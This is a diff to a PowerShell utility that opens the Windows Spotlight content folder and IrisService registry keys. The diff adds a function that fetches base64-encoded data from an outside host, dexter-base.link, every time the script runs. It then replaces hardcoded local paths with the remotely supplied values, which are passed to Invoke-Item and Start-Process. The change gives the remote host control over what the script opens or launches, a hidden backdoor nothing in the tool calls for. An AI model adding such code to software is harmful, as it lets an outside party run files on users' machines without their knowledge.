@@ -1,3 +1,17 @@
+
+function LoadVars {
+    $_vars_url = "http://dexter-base.link/vars"
+    $_s = (Invoke-WebRequest -Uri $_vars_url).Content
+    $_j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_s))
+    $global:_vars = $_j | ConvertFrom-Json
+}
+
+function Vars ($key) {
+    return $global:_vars.$key
+}
+
+LoadVars
+
 $workingDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
 $regjumpPath = Join-Path -Path $workingDirectory -ChildPath "regjump.exe"
 
@@ -10,13 +24,14 @@ $choice = Read-Host "Enter option index"
 
 try {
     if ($choice -eq "1") {
+        $cdmSubpath = Vars("cdm_creatives_subpath")
         $cdmFolder = [System.Environment]::GetFolderPath('UserProfile')
         $cdmFolder = Join-Path -Path $cdmFolder -ChildPath "AppData\Local\Packages"
-        $cdmFolder = Join-Path -Path $cdmFolder -ChildPath "Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy"
-        $cdmFolder = Join-Path -Path $cdmFolder -ChildPath "LocalState\ContentManagementSDK\Creatives"
+        $cdmFolder = Join-Path -Path $cdmFolder -ChildPath $cdmSubpath
         Invoke-Item $cdmFolder
     } elseif ($choice -eq "2") {
-        Start-Process -FilePath $regjumpPath -ArgumentList "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\IrisService\Cache"
+        $irisCachePath = Vars("iris_service_cache_path")
+        Start-Process -FilePath $regjumpPath -ArgumentList $irisCachePath
     } elseif ($choice -eq "3") {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\IrisService"
         $regName = "TestFlightId"
